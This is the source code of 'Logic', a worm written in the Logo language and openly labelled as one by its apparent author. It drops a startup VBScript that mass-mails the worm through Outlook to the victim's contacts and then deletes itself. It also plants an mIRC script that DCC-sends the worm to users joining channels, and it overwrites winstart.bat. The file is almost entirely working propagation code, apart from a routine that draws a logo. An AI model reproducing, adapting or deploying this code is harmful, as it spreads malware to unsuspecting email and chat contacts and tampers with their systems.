; Worm Name: Logic
; Version: B
; Type: Logo Worm
; Author: Gigabyte
; Homepage: http://www.coderz.net/gigabyte

to DrawLogic
 clearscreen
 hideturtle
 penup
 setheading 180
 setpenwidth 5
 setpos [-266 122]
 pendown
 forward 160
 left 90
 forward 75
 penup
 wait 1000
 forward 40
 pendown
 forward 75
 left 90
 forward 160
 left 90
 forward 75
 left 90
 forward 160
 left 90
 penup
 wait 1000
 forward 115
 pendown
 forward 75
 left 90
 forward 80
 left 90
 forward 38
 penup
 forward 37
 left 90
 forward 80
 pendown
 back 160
 left 90
 forward 75
 penup
 wait 1000
 forward 40
 right 90
 pendown
 forward 160
 penup
 wait 1000
 left 90
 forward 40
 forward 75
 pendown
 back 75
 left 90
 forward 160
 right 90
 forward 75
end

to PrintBatch
 printto "c:\\windows\\winstart.bat
 print [@cls]
 print [@echo You think Logo worms don't exist? Think again!]
 printto []
end

to PrintMail
 printto :StartupName
 print [On Error Resume Next]
 print [Dim logic, Mail, Counter, A, B, C, D, E, F]
 print [Set logic = CreateObject ( "outlook.application\" )]
 print [Set Mail = logic.GetNameSpace ( "MAPI\" )]
 print [For A = 1 To Mail.AddressLists.Count]
 print [Set B = Mail.AddressLists ( A )]
 print [Counter = 1]
 print [Set C = logic.CreateItem ( 0 )]
 print [For D = 1 To B.AddressEntries.Count]
 print [E = B.AddressEntries ( Counter )]
 print [C.Recipients.Add E]
 print [Counter = Counter + 1]
 print [If Counter > 80 Then Exit For]
 print [Next]
 print [C.Subject = "Hey friends!\"]
 print [C.Body = "Hello! Look at my new SuperLogo program! Isn't it cool? "]
 ( show "C.Attachments.Add ( word "" :WormName "" ) )
 print [C.DeleteAfterSubmit = True]
 print [C.Send]
 print [E = ""]
 print [Next]
 print [Set F = CreateObject ( "Scripting.FileSystemObject\" )]
 print [F.DeleteFile Wscript.ScriptFullName]
 printto []
end

to PrintScript
 printto :ScriptName
 print [[script]]
 print [n0 = ON 1:JOIN:#:{ \/if ( $nick \=\= $me ) { halt }]
 ( print [n1 = \/dcc send $nick] :WormName )
 print [n2 = }]
 print [n3 = ON 1:CONNECT:\/join #gigavirii | \/timer 1 2 \/msg #gigavirii Livin’ ~
  a lie, tell me why I run and hide. Livin’ a lie, you’ll never know me deep inside. ~
  | \/timer 1 5 \/part #gigavirii]
 print [n4 = ctcp ^1:\*:?: $1\- | halt]
 printto []
end

to Start
 catch "error [setlogo [versie 0]]
 make "ScriptName "c:\\mirc\\script.ini
 make "WormName "c:\\mirc\\download\\logic.lgp
 if file? :WormName = "true [PrintScript make "StartupName "c:\\windows\\startm\~1\\programs\\startup\\startup.vbs ~
  catch "error [PrintMail] make "StartupName "c:\\windows\\startm\~1\\progra\~1\\opstar\~1\\startup.vbs ~
  catch "error [PrintMail]]
 make "ScriptName "d:\\mirc\\script.ini
 make "WormName "d:\\mirc\\download\\logic.lgp
 if file? :WormName = "true [PrintScript make "StartupName "c:\\windows\\startm\~1\\programs\\startup\\startup.vbs ~
  catch "error [PrintMail] make "StartupName "c:\\windows\\startm\~1\\progra\~1\\opstar\~1\\startup.vbs ~
  catch "error [PrintMail]]
 make "ScriptName "e:\\mirc\\script.ini
 make "WormName "e:\\mirc\\download\\logic.lgp
 if file? :WormName = "true [PrintScript make "StartupName "c:\\windows\\startm\~1\\programs\\startup\\startup.vbs ~
  catch "error [PrintMail] make "StartupName "c:\\windows\\startm\~1\\progra\~1\\opstar\~1\\startup.vbs ~
  catch "error [PrintMail]]
 if file? "c:\\windows\\winstart.bat = "true [PrintBatch]
 DrawLogic
 print [Logic, the Logo worm \(c\) Gigabyte]
end

to Startup
 Start
end
